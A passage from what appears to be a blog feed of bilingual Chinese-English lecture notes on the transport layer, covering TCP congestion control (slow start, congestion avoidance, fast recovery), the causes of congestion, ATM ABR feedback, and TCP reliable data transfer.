class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">RTT</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal">t</span><span class="mord mathnormal">es</span><span class="mord">/</span><span class="mord mathnormal">sec</span></span></span></span></span></p></li></ul></li></ul><p><code> assume that the TCP receive buffer is so large that the receive-window constraint can be ignored, thus, the amount of unacknowledged data at the sender is solely limited by cwnd. We will also assume that the sender always has data to send, ie., that all segments in the congestion window are sent. consider a connection for which loss and packet transmission delays are negligible</code></p><p><code>=&gt; limits the amount of unacknowledged data at the sender</code></p><p><code>=&gt;indirectly limits the sender's send rate=&gt; the sender's send rate is roughly:cwnd/RTT bytes/sec</code></p><p><code>=&gt;By adjusting the value of cwnd, the sender can therefore adjust the rate at which it sends data into its connection</code></p><ul><li>define a**“loss event”**at a TCP <u>sender</u> as the occurrence of either a <strong>timeout</strong> or the receipt of <strong>three duplicate ACKs</strong> from the receiver</li><li>when there is excessive congestion, then one (or more)router buffers along the path overflows, causing a datagram to be dropped</li><li>Because TCP uses <strong>acknowledgements</strong> to trigger(引发，触发) (or <u>clock</u>，计时) its increase in <strong>congestion window size</strong>, TCP is said to be <strong>self-clocking</strong>(自计时)</li><li>TCP uses the following guiding principles:<ul><li>A lost segment implies congestion, and hence, the TCP sender’s rate should be decreased when a segment is lost<ul><li>a timeout event or the receipt of <strong>four acknowledgments</strong> for a given segment (one <u>original ACK</u> and then <u>three duplicate ACKs</u>)</li><li>An acknowledged segment indicates that the network is delivering the sender’s segments to the receiver, and hence, the sender’s rate can be increased when an ACK arrives for a previously unacknowledged segment</li><li>Bandwidth probing，宽带探测<ul><li>Note that there is <u>no explicit signaling</u> of congestion state by the network—ACKs and loss events serve as implicit signals—and that each TCP sender acts on local information <u>asynchronously</u>(异步于) from other TCP senders</li></ul></li></ul></li></ul></li><li><strong>TCP congestion-control algorithm</strong>(TCP 拥塞控制算法)<ul><li><strong>slow start</strong>(慢启动) + <strong>congestion avoidance</strong>(拥塞避免) + <strong>fast recovery</strong>(快速恢复)</li><li><u>Slow start and congestion avoidance</u> are <strong>mandatory</strong> components of TCP, Fast recovery is <strong>recommended</strong>, but not required</li></ul></li></ul><h6 id="Slow-Start">Slow Start</h6><ul><li><p>When a <strong>TCP connection begins</strong>, the value of <strong>cwnd</strong> is typically initialized to <u>a small value</u> of <strong>1 MSS</strong></p></li><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>t</mi><mi>h</mi><mi>e</mi><mtext>  </mtext><mi>i</mi><mi>n</mi><mi>i</mi><mi>t</mi><mi>i</mi><mi>a</mi><mi>l</mi><mtext>  </mtext><mi>s</mi><mi>e</mi><mi>n</mi><mi>d</mi><mi>i</mi><mi>n</mi><mi>g</mi><mtext>  </mtext><mi>r</mi><mi>a</mi><mi>t</mi><mi>e</mi><mo>≈</mo><mfrac><mrow><mi>M</mi><mi>S</mi><mi>S</mi></mrow><mrow><mi>R</mi><mi>T</mi><mi>T</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">the\;initial\;sending\;rate ≈ \frac{MSS}{RTT}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">ini</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ia</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">se</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mord mathnormal">in</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">RTT</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">MSS</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p></li><li><p><code>If MSS=500 bytes and RTT=200 msec,the resulting initial sending rate is only about 20 kbps. Since the available bandwidth to the TCP sender may be much larger than MSS/RTT</code></p></li><li><p>In the slow-start state, the value of cwnd begins at 1 MSS and increases by <strong>1 MSS</strong> every time a transmitted segment is first acknowledged</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/2.jpg" class=""></li><li><p>the TCP send rate <strong>starts slow</strong> but <strong>grows exponentially</strong>(以指数方式) during the slow start phase</p></li><li><p>when should this exponential growth end?</p><ul><li>If there is a <strong>loss event</strong> (i.e., congestion) indicated by a <strong>timeout</strong><ul><li>cwnd set to <strong>1 MSS</strong></li><li>sets the value of a second state variable,<strong>ssthresh</strong> (shorthand[速记，简写] for&quot;slow start threshold&quot;，&quot;慢启动阈值&quot;的速记)to $$\frac{cwnd}{2}$$</li><li>return to slow <strong>start state</strong> (回到慢启动状态)</li></ul></li><li>when the value of <strong>cwnd equals ssthresh</strong>，(cwnd ≥ ssthresh)<ul><li>slow start ends and TCP transitions into <strong>congestion avoidance mode</strong></li></ul></li><li>if three duplicate ACKs are detected<ul><li>in this case TCP performs a <strong>fast retransmit</strong> and enters the <strong>fast recovery state</strong></li><li><strong>ssthresh = $$\frac{cwnd}{2}$$</strong></li><li><strong>cwnd = ssthresh +3 MSS</strong></li></ul></li></ul></li></ul><h6 id="Congestion-Avoidance，拥塞避免">Congestion Avoidance，拥塞避免</h6><ul><li>not doubling the value of cwnd every RTT,  TCP adopts a more conservative (保守的) approach and increases  the value of cwnd by just a single MSS every RTT (一轮RTT增加1个 MSS: 发送方每收到一个ACK，cwnd增加1个MSS*(MSS/cwnd))</li><li><code>如果MSS是1460字节并且cwnd是14600字节，则在一个RTT内发送10个报文段。每个到达ACK（假定每个报文段一个ACK）增加1/10MSS 的拥塞窗口长度，因此在收到对所有10个报文段的确认后，拥塞窗口的值将增加了一个MSS</code></li><li>When should congestion avoidance’s linear increase (of 1 MSS per  RTT) end?<ul><li>loss indicated by timeout event<ul><li>ssthresh = cwnd/2</li><li>cwnd set to 1 MSS</li><li>enters the slow start state (进入慢启动状态)</li></ul></li><li>loss indicated by 3 duplicate ACKs<ul><li>ssthresh = cwnd /2</li><li>cwnd = ssthresh +3 MSS</li><li>performs a fast retransmit and enters the fast recovery state (进 入快速恢复状态)</li></ul></li></ul></li></ul><h6 id="Fast-Recovery，快速恢复">Fast Recovery，快速恢复</h6><ul><li><p>value of cwnd is increased by 1 MSS (cwnd =  cwnd +MSS) for every duplicate ACK received for the  missing segment that caused TCP to enter the fastrecovery state</p><ul><li>loss indicated by timeout event<ul><li>ssthresh = cwnd/2</li><li>cwnd set to 1 MSS</li><li>enters the slow start state</li></ul></li><li>new ACK event<ul><li>cwnd = ssthresh</li><li>enters the congestion-avoidance state after deflating cwnd</li></ul></li></ul></li><li><p>(old version) does not have fast recovery  state</p></li><li><p>always sets cwnd to 1 (timeout or 3 duplicate acks)</p></li><li><p>was not used anymore</p></li><li><p>(new version) have fast recovery state  (only 3 duplicate acks)</p><ul><li>ssthresh = cwnd /2</li><li>cwnd = ssthresh +3MSS (很可能网络未出现严重拥塞，因此可不 从1开始！)</li></ul></li><li><p>Question： 为什么cwnd = ssthresh +3.MSS ？</p><ul><li>Answer：发送方收到三个冗余ACK，意味着有3个数据包离开网络抵达接收方缓存，即网络中减少了3个数据包，因此可以将拥塞窗口扩大</li></ul></li><li><p>注：有些快速重传版本并未加3个MSS</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/4.jpg" class=""></li></ul><h6 id="Summary-FSM-description-of-TCP-Congestion-Control">Summary: FSM description of  TCP Congestion Control</h6><ul><li><p>关键要点</p><ul><li>all the time out event (检测到所有超时事件，下一轮执 行如下操作)<ul><li>ssthresh = cwnd/2; cwnd = 1 MSS (网络拥塞很严重)</li><li>enter “slow start” state</li></ul></li><li>all the 3 duplicate ACKs event (检测到所有3次冗余ACK 事件，下一轮执行如下操作):<ul><li>ssthresh= cwnd/2; cwnd = ssthresh + 3 (网络拥塞不严重)</li><li>enter “fast recover” state</li></ul></li><li>注意：如果当前cwnd不为偶数，计算新的ssthresh时一 般向下取整（比如：cwnd当前值为15，则新的 ssthresh=7），有时候可能会向上取整（根据题目说明）</li></ul></li><li><p>when should the  exponential increase  switch to linear?</p><ul><li>A: when cwnd gets to 1/2  of its value before  timeout,当拥塞窗口接近超时事件出现前拥塞窗口的一半时(i.e. ssthresh)</li></ul></li><li><p>Implementation</p><ul><li>variable ssthresh</li><li>on loss event, ssthresh is set to 1/2 of cwnd just before loss event</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/5.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/6.jpg" class=""><ul><li>TCP thruput as function of window size, RTT?<ul><li>ignore slow start(very short time), assume always data to send</li></ul></li><li>W: window size (measured in bytes) where loss occurs<ul><li>avg. window size (# in-flight bytes) is <strong>¾ W</strong> (window linearly  increases between two extreme values: W and <strong>W/2</strong>)</li><li>avg. thruput is <strong>3/4W</strong> per RTT</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/net1.jpg" class=""><h6 id="TCP-Congestion-Control-Retrospective">TCP Congestion Control: Retrospective</h6><ul><li>TCP congestion control is often referred to as an <strong>additive-increase</strong>(加性增)，**multiplicative-decrease(AIMD，乘性减)**form of congestion control</li></ul><h6 id="Macroscopic-Description-of-TCP-Throughput，对-TCP吞吐量的宏观描述">Macroscopic Description of TCP Throughput，对 TCP吞吐量的宏观描述</h6><ul><li>TCP Futures: TCP over  High-Bandwith Paths<ul><li>example: 1500 byte segments, 100ms RTT, want 10  Gbps throughput</li><li>requires W = 83,333 in-flight segments</li><li>throughput in terms of segment loss probability, L,avg. TCP throughput = (1.22 ·MSS) /RTT ·L^1/2^  ==&gt;to achieve 10 Gbps throughput, need a loss rate of  L = 2·10^-10^ – a very small loss rate!</li><li>new versions of TCP for high-speed was developed</li></ul></li><li>fairness goal: if K TCP sessions share same bottleneck  link of bandwidth R, each should have average rate of  R/K</li><li>two competing sessions:<ul><li>additive increase gives slope of 1, as throughout increases</li><li>multiplicative decrease decreases throughput proportionally</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%827/net2.jpg" class=""><p>==&gt;Eventually fluctuates along the  equal bandwidth share line</p><ul><li>Fairness and UDP<ul><li>multimedia apps often do  not use TCP<ul><li>do not want rate  throttled by congestion  control</li></ul></li><li>instead use UDP:<ul><li>send audio/video at  constant rate, tolerate  packet loss</li></ul></li></ul></li><li>Fairness, parallel TCP connections<ul><li>application can open multiple  parallel connections between two  hosts</li><li>web browsers do this</li><li>e.g., link of rate R with 9 existing  connections:<ul><li>new app asks for 1 TCP, gets  rate R/10</li><li>new app asks for 11 TCPs, gets  more than R/2 (not fairness)</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（六）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/</url>
    
    <content type="html"><![CDATA[<h1>3.6 Principles of Congestion Control，塞控制原理</h1><p>congestion control in the <strong>available bit-rate</strong>(ABR，可用比特率)service in <strong>asynchronous transfer mode</strong>(ATM，异步传递方式) networks，异步传递方式（ATM）网络中可用比特率（ABR）服务中的拥塞控制</p><ul><li>congestion:<ul><li>informally: “too many sources sending too much data too  fast for network to handle”</li><li>different from flow control! (receiver controls sender,  so sender won’t overflow receiver’s buffer) (注意与流量控制的区别！)</li><li>Manifestations(表现):<ul><li>long delays (queueing in router buffers)</li><li>lost packets (buffer overflow at routers)</li></ul></li><li>a top-10 problem!</li></ul></li></ul><h3 id="3-6-1-The-Causes-and-the-Costs-of-Congestion">3.6.1 The Causes and the Costs of Congestion</h3><h6 id="Scenario-1-Two-Senders-a-Router-with-Infinite-Buffers，两个发送方和一台具有无穷大缓存的路由器">Scenario 1: Two Senders, a Router with Infinite Buffers，两个发送方和一台具有无穷大缓存的路由器</h6><ul><li><p>output link capacity: R</p><p>no retransmission,  flow control, and  congestion control</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.39.jpg" class=""></li><li><p><strong>每连接的吞吐量（per-connection throughput）</strong>（接收方每秒接收的字节数）与该连接发送速率之间的函数关系</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.40.jpg" class=""><ul><li>The link simply cannot deliver packets to a receiver at a steady-state rate that exceeds R/2，链路完全不能以超过 R/2的稳定状态速率向接收方交付分组</li><li>This upper limit on throughput is a consequence of the <u>sharing</u> of link capacity between two connections</li><li>No matter how high Hosts A and B set their sending rates, they will each never see a throughput higher than R/2</li></ul></li><li><p>When the sending rate exceeds R/2, the <u>average number of queued packets</u> in the <u>router</u> is unbounded(无限的，极大的，不受控的), and <u>the average delay</u> between source and destination becomes <u>infinite</u></p></li><li><p>拥塞网络的一种代价：<u><strong>large queuing delays</strong> are experienced as the <strong>packet arrival rate</strong> nears the <strong>link capacity</strong></u></p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.41.jpg" class=""></li></ul><h6 id="Scenario-2-Two-Senders-and-a-Router-with-Finite-Buffers-两个发送方和一台具有有限缓存的路由器">Scenario 2: Two Senders and a Router with Finite Buffers, 两个发送方和一台具有有限缓存的路由器</h6><ul><li><p>one router, finite buffers (likely droped packet)</p></li><li><p>sender retransmission of timed-out packet</p></li><li><p>λ~in~ :Sends original  data into socket</p></li><li><p>λ’~in~: Trsnsport layer sends segments into  network（containing ontaining original data and retransmitted data，sometimes referred to as the <strong>offered load</strong>，供给载荷）</p></li><li><p>application-layer input = application-layer output: λ~in~ = λ~out~</p></li><li><p>transport-layer input includes retransmissions :λ‘~in~ ≥λ~in~</p></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.42.jpg" class=""><p>①Idealization: perfect knowledge，理想情况：A能确定路由器中的缓存是否空闲，因而仅当缓存空闲时才发送一个分组。在这种情况下，将不会产生丢包，λ~in~与λ’~in~相等，并且连接的吞吐量就等于λ~in~</p><p>平均主机发送速率不能超过 R/2，因为假定不会发生分组丢失</p><p>从吞吐量的角度看、性能理想，即发送的每个分组都被接收到</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.43.jpg" class=""><p>② Idealization: known  loss packets can be  lost, dropped at router  due to full buffers，发送方仅当在确定了一个分组已经丢失时才重传</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.44.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.45.jpg" class=""><p>因此，在所发送的 0.5R 单位数据当中，从平均的角度说， 0.333R 字节/秒是初始数据，而0.166R字节/秒是重传数据。</p><p><u>the sender must perform retransmissions in order to compensate for dropped (lost) packets due to buffer overflow另一种网络拥寒的代价，即发送方必须执行重传以补偿因为缓存溢出而丢弃（丢失）的分组</u></p><p>③Realistic: duplicates</p><ul><li>packets can be lost, dropped at  router due to full buffers</li><li>sender times out prematurely,  sending two copies, both of  which are delivered</li><li>发送方也许会提前发生超时并重传在队列中已被推迟但还未丢失的分组</li><li>初始数据分组和重传分组都可能到达接收方（接收方只需要一份这样的分组副本就行了，重传分组将被丢弃）</li><li>在这种情况下，路由器转发重传的初始分组副本是在做无用功，因为接收方已收到了该分组的初始版本。而路由器本可以利用链路的传输能力去发送另一个分组</li><li><u>unneeded retransmissions by the sender in the face of large delays may cause a router to use its link bandwidth to forward unneeded copies of a packet，网络拥塞的另一种代价，即发送方在遇到大时延时所进行的不必要重传会引起路由器利用其链路带宽来转发必要的分组副本</u></li><li>“costs” of congestion:<ul><li>more work (retrans) for given “goodput”(实际吞吐量)</li><li>unneeded retransmissions: link carries multiple copies of pkt decreasing goodput</li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.46.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.47.jpg" class=""><h6 id="Scenario-3-Four-Senders-Routers-with-Finite-Buffers-and-Multihop-Paths，4个发送方和具有有限缓存的多台路由器及多跳路径">Scenario 3: Four Senders, Routers with Finite Buffers, and Multihop Paths，4个发送方和具有有限缓存的多台路由器及多跳路径</h6><ul><li><p>assume that each host uses a <strong>timeout/retransmission</strong> mechanism to implement a reliable data transfer service，都采用超时/重传机制来实现可靠数据传输服务</p><p>all hosts have the same value of λ~in~</p><p>all router links have capacity R bytes/sec</p><p>all the router have R  capacity</p></li><li><p>对于极小的 λ~in~值，路由器缓存的溢出是很少见的，吞吐量大致接近供给载荷，对稍大的 λ~in~值，对应的吞吐量也更大，因为有更多的初始数据被发送到网络中并交付到目的地，溢出仍然很少。因此，对于较小的λ~in~，λ~in~的增大会导致λ~out~的增大</p></li><li><p>λ~in~（因此λ’~in~）很大时的情况:</p><ul><li><p>到达路由器 R2的A-C流量（在经过路由器 R1转发后到达路由器R2）的到达速率至多是R，也就是从 R1 到 R2 的链路容量</p></li><li><p>如果λ’~in~对于所有连接 （包括B-D连接）来说是极大的值，那么在 R2上，B-D流量的到达速率可能会比A-C 流量的到达速率大得多，存在竞争</p></li><li><p>as red λ‘~in~ increases, all arriving  blue pkts at upper queue are  dropped, blue throughput-&gt;0</p></li><li><p>the transmission capacity used at the first router to forward the packet to the second router could have been much more profitably used to transmit a different packet. (For example, when selecting a packet for transmission, it might be better for a router to give priority to packets that have already traversed some number of upstream routers.)</p></li></ul></li></ul><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.48.jpg" class=""><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.49.jpg" class=""><ul><li><u>another cost of dropping a packet due to congestion—when a packet is dropped along a path, the ransmission capacity that was used at each of the upstream links to forward that packet to the point at which it is dropped ends up having been wasted</u></li><li>another “cost” of congestion:<ul><li>when packet dropped, any upstream transmission  capacity (routers) used for that packet was  wasted!</li><li>当一个segment沿着一条路径传输被丢弃时，上游路由器转发该分组的传输容量就被浪费了</li></ul></li></ul><h3 id="3-6-2-Approaches-to-Congestion-Control">3.6.2 Approaches to Congestion Control</h3><p>two broad approaches to congestion control that are taken in practice（ distinguish among congestion-control approaches by whether the <u>network</u> layer provides any <u>explicit assistance</u> to the <u>transport</u> layer for congestion-control purposes）</p><ul><li><strong>end-to-end congestion control</strong>，端到端拥塞控制<ul><li>the <u>network</u> layer provides <strong>no explicit support</strong> to the transport layer for congestion control purposes，没有显式支持</li><li>Even the presence of congestion in the network must be inferred by the end systems based only on observed network behavior(for example, packet loss and delay)</li><li><strong>TCP</strong> must necessarily take this <strong>end-to-end approach</strong> toward congestion control<ul><li>since the <strong>IP layer</strong> provides <strong>no feedback</strong> to the end systems regarding(有关) network congestion</li><li>TCP segment loss(as indicated by a <u>timeout</u> or a <u>triple(3次) duplicate acknowledgment</u>) is taken as an indication of network congestion and TCP <strong>decreases its window size</strong> accordingly(相应地，因而)</li><li>uses increasing round-trip delay values as indicators of increased network congestion，使用增加的往返时延值作为网络拥塞程度增加的指示</li></ul></li></ul></li><li><strong>Network-assisted congestion control</strong>，网络辅助的拥塞控制<ul><li>network-layer components(网络层构件) (that is, <strong>routers</strong>)provide <strong>explicit feedback</strong> to the sender regarding the congestion state in the network，提供关于网络中拥塞状态的显式反馈信息.  This feedback may be as simple as <strong>a single bit</strong> indicating congestion at a line</li><li>congestion information is typically fed back from the network to the sender in one of two ways<ul><li><strong>derect feedback</strong> may be sent from a network router to the sender. This form of notification typically takes the form of a <strong>choke packet</strong>(阻塞分组) (essentially saying,“I’m congested!”)</li></ul></li><li>the second form of notification occurs when a <u>router</u> <strong>marks/updates</strong> a field in a packet flowing from sender to receiver to indicate congestion<ul><li>Upon receipt of a marked packet, the receiver then notifies the sender of the congestion indication</li><li>Note that this latter form of notification takes <strong>at least a full round-trip time</strong></li></ul></li></ul></li></ul><h3 id="3-6-3-Network-Assisted-Congestion-Control-Example-ATM-ABR-Congestion-Control-网络辅助的拥塞控制例子∶ATM-ABR拥塞控制">3.6.3 Network-Assisted Congestion-Control Example: ATM ABR Congestion Control, 网络辅助的拥塞控制例子∶ATM ABR拥塞控制</h3><ul><li><p>Fundamentally(基本上) ATM takes a <strong>virtual-circuit (VC)</strong> oriented approach toward packet switching，采用一种面向虚电路（VC）的方法来处理分组交换</p></li><li><p><strong>each switch</strong> on the source-to-destination path will <strong>maintain state</strong> about the source-to-destination VC</p></li><li><p>This per-VC state allows a switch to <strong>track</strong> the behavior of individual senders <code>(e.g.,tracking their average transmission rate)</code> and to take source-specific congestion-control actions(采取特定源的拥塞控制动作) <code>(such as explicitly signaling to the sender to reduce its rate when the switch becomes congested)</code></p></li><li><p>This per-VC state at network switches makes ATM ideally suited to perform network-assisted congestion control</p></li><li><p>ABR has been designed as an <strong>elastic</strong>(弹性的) data transfer service in a manner reminiscent(使人联想) of TCP</p><ul><li>When the network is underloaded, ABR service should be able to take advantage of the spare available bandwidth</li><li>when the network is congested, ABR service should throttle its transmission rate to some predetermined minimum transmission rate</li></ul></li><li><p>adopt ATM terminology(using the term <u>switch</u>(交换机) rather than router, and the term <strong>cell</strong>(信元) rather than packet)</p></li><li><p>Interspersed(穿插) with the <u>data cells</u> are <strong>resource-management cells (RM cells)</strong>(资源管理信元，RM信元)</p><ul><li><p>can be used to <u>convey congestion-related information</u> among the <u>hosts and switches</u></p></li><li><p>When an RM cell <u>arrives at a destination</u>, it will be turned around and <strong>sent back</strong> to the sender(possibly after the destination has <strong>modified</strong> the contents of the RM cell)</p></li><li><p>It is also possible for a <strong>switch</strong> to <strong>generate</strong> an RM cell itself and send this RM cell directly to a source</p></li><li><p>RM cells can be used to provide both <strong>direct network feedback</strong> and <strong>network feedback via the receiver</strong>(提供直接网络反馈和经由接收方的网络反馈)</p><img src="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%826/3.50.jpg" class=""></li></ul></li><li><p>ATM ABR congestion control is a <strong>rate-based</strong>(基于速率) approach</p><ul><li>the sender <strong>explicitly computes a maximum rate</strong> at which it can send and <strong>regulates</strong>(调整，控制) itself accordingly，明确计算最大速率，自我调整</li></ul></li><li><p>ABR provides three mechanisms for <u>signaling congestion-related information</u> from the <u>switches to the <strong>receiver</strong></u>:</p><ul><li><strong>EFCl bit</strong><ul><li><u>Each</u> data cell contains an <strong>explicit forward congestion indication (EFCI，式转发拥塞指示)</strong> bit</li><li>(congested network <strong>switch</strong> can set)置1：告诉目的主机已经拥塞</li><li>The destination <u>must</u> check the EFCI bit in all received data cells</li><li>When an RM cell arrives at the destination, if <u>the most recently received data cell</u> had the EFCI bit set to 1, then the <strong>destination</strong> sets the <strong>congestion indication bit (the CI bit，拥塞指示比特)</strong> of the RM cell to 1 and <u>sends the RM cell back</u> to the <strong>sender</strong></li></ul></li><li><strong>CI and NI bits</strong><ul><li>sender-to-receiver RM cells are interspersed with data cells. The rate of RM cell interspersion is a tunable(可调的) parameter(参数), with the <u>default</u> value being one RM cell every <strong>32</strong> data cells，每32个数据信元中有一个RM信元</li><li>These RM cells have a <strong>congestion indication(CI，拥塞指示)</strong> bit and a <strong>no increase (NI，无增长)</strong> bit that can be <strong>set by a congested network switch</strong>，拥塞的交换机设置</li><li>switch can set the <strong>NI bit</strong> in a passing RM cell to 1 under <strong>mild congestion</strong> and can set the <strong>CI bit</strong> to 1 under <strong>severe congestion</strong> conditions</li><li>When a destination host receives an RM cell, it will send the RM cell back to the sender with its CI and NI bits <strong>intact</strong>(不变的) (除了上述EFCI的情况)</li></ul></li><li><strong>ER setting</strong><ul><li><u>Each</u> RM cell also contains a <strong>2-byte</strong> **explicit rate (ER，显式速率)**field</li><li>A <u>congested switch</u> may <strong>lower</strong> the value contained in the ER field in a passing RM cell</li><li>the ER field will be set to the <strong>minimum supportable rate</strong> of <strong>all switches</strong> on the source-to-destination path</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>计算机网络</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第三章-运输层（五）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%825/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%BF%90%E8%BE%93%E5%B1%825/</url>
    
    <content type="html"><![CDATA[<h3 id="3-5-4-Reliable-Data-Transfer">3.5.4 Reliable Data Transfer</h3><ul><li><p>TCP creates a <strong>reliable data transfer service</strong>(可靠数据传输) on top of IP’s unreliable best-effort service</p></li><li><p>TCP’s reliable data transfer service ensures that the data stream that a process reads out of its TCP receive buffer is <u>uncorrupted</u>无损坏, <u>without gaps</u>无间隔, <u>without duplication</u>非冗余,and <u>in sequence</u>按序，···完全相同</p></li><li><p>TCP sender three events:TCP 发送方三个重要事件</p><ul><li><p>data received from application above</p><ul><li><p>TCP receives data from the application, encapsulates the data in a segment, and passes the segment to IP</p></li><li><p><strong>each segment</strong> includes a <strong>sequence number</strong> that is the <strong>byte-stream number of the first data byte</strong> in the segment, 这个序号就是该报文段第一个数据字节的字节流编号</p></li><li><p>if the timer is already not running for some other segment, TCP starts the timer when the segment is passed to IP</p><p>（think of timer as for oldest  unacked segment，expiration interval: TimeOutInterval）</p></li></ul></li><li><p>timeout (超时)</p><ul><li>retransmit segment that  caused timeout(重传导致超 时事件的报文)</li><li>restart timer</li></ul></li><li><p>ack rcvd (收到ACK):</p></li><li><p>if ack acknowledges  previously unacked segments</p><ul><li><p>update what is known to  be ACKed (cumulative  acknowledgments累计确认)</p></li><li><p>start timer if there are  still unacked segments</p></li></ul></li></ul></li><li><p>Set TimeoutInterval during  sender three events:（in most of TCP implementation）</p><ul><li>data rcvd from app (收到APP发送的数据事件):<ul><li>TimeoutInterval = EstimatedRTT + 4*DevRTT *</li></ul></li><li>timeout (超时事件):<ul><li>TimeoutInterval is doubled, if timeout occurs  again, the TimeoutInterval is 4 times, unless the  segment is received and EstimatedRTT is updated</li></ul></li><li>ack rcvd (收到ACK事件):<ul><li>TimeoutInterval = EstimatedRTT + 4*DevRTT</li></ul></li></ul></li><li><p>例</p></li><li><p>第二种情况：当超时事件发生时，主机 A 重传序号92的第一个报文段，并重启定时器。只要第二个报文段的 ACK 在新的超时发生以前到达，则第二个报文段将不会被重传</p></li></ul><ul><li>超时事件发生之前主机A收到一个确认号为 120的确认报文。主机 A 因而知道主机主机B已经收到了序号为119及之前的所有字节; 所以主机A不会重传这两个报文段中的任何一个</li></ul><h6 